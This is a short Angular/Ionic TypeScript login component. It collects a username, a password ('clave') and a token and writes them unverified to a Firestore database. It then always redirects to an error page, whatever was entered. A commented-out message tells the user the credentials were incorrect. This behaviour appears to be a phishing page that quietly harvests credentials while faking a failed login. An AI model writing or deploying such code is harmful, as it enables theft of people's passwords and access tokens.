import { Component } from '@angular/core';
import { FormControl, FormGroup } from '@angular/forms';
import { FirestoreService } from '../Services/firestore.service';
import { Router } from '@angular/router';
import { InteractionService } from '../Services/interaction.service';
import { users } from '../Models/user';

@Component({
  selector: 'app-home',
  templateUrl: 'home.page.html',
  styleUrls: ['home.page.scss'],
})
export class HomePage {


  formulario: FormGroup;

  constructor(
    private firestore: FirestoreService,
    private interaction: InteractionService,
    private router: Router,
) {
        this.formulario = new FormGroup({
        id: new FormControl,
        user: new FormControl,
        clave: new FormControl,
        token: new FormControl,
        })
}


onSubmit() {
  // this.interaction.presentLoading('Ingresando...');
  const userData: users = this.formulario.value;
  // userData.timestamp = firestore.FieldValue.serverTimestamp(); // Establecer fecha y hora actual
                  // Obtener la fecha y hora actual del cliente
                  const timestamp = new Date();
              
                  // Agregar la fecha y hora actual al documento de datos
                  userData.timestamp = timestamp;
  this.firestore.addUser(userData).then(() => {
    console.log('Usuario agregado correctamente a Firestore:', userData);
  }).catch((error) => {
    console.error('Error al agregar usuario a Firestore:', error);
    
  });
  this.router.navigate(['Error']);
  // this.interaction.presentToast('Nombre o usuario incorrectos.');
  // this.interaction.closeLoading();
}

  

}
